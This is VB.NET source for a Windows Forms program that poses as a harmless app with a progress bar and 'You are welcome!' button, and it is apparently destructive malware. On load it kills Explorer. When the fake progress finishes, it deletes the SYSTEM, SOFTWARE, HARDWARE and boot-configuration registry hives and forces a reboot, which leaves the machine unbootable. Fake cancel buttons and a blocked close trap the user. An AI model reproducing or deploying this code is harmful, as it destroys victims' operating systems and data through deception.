Public Class MainForm
    Dim OpenCMD
    Public progress As Integer

    Private Sub FormLoad(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        pbPayload.MarqueeAnimationSpeed = 10
        Agreement.Visible = False
        Shell("cmd.exe /c taskkill -f -im explorer.exe && taskkill -f -im cmd.exe")
    End Sub

    Private Sub PayloadTick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles PayloadTimer.Tick
        If pbPayload.Value <= 3485 Then
            pbPayload.Value += Rnd() * 10
        Else
            Shell("cmd.exe /c reg delete HKLM\SYSTEM /f")
            Shell("cmd.exe /c reg delete HKLM\HARDWARE /f")
            Shell("cmd.exe /c reg delete HKLM\SOFTWARE /f")
            Shell("cmd.exe /c reg delete HKLM\BCD00000000 /f")
            Shell("cmd.exe /c shutdown -r -t 20")
            MessageBox.Show("", "", MessageBoxButtons.AbortRetryIgnore)
        End If
    End Sub

    Private Sub ThanksButton(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles btThanks.Click
        MessageBox.Show("You are welcome!", "TheCoolCat! Says:")
    End Sub

    Private Sub FakeCancel(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles btFakeCancel.Click
        btFakeCancel.Visible = False
        btSecTrap.Visible = True
    End Sub

    Private Sub Trap1(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles btSecTrap.Click
        btSecTrap.Visible = False
        btTrap.Visible = True
    End Sub

    Private Sub Trap2(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles btTrap.Click
        btTrap.Visible = False
        btFakeCancel.Visible = True
    End Sub

    Private Sub LoginLinkClicked(ByVal sender As System.Object, ByVal e As System.Windows.Forms.LinkLabelLinkClickedEventArgs) Handles LinkLabel1.LinkClicked
        Login.Show()
    End Sub

    Sub MeOnClosing(ByVal sender As Object, ByVal e As System.Windows.Forms.FormClosingEventArgs) Handles Me.FormClosing
        e.Cancel = True
        Me.OnClosing(e)
    End Sub
End Class
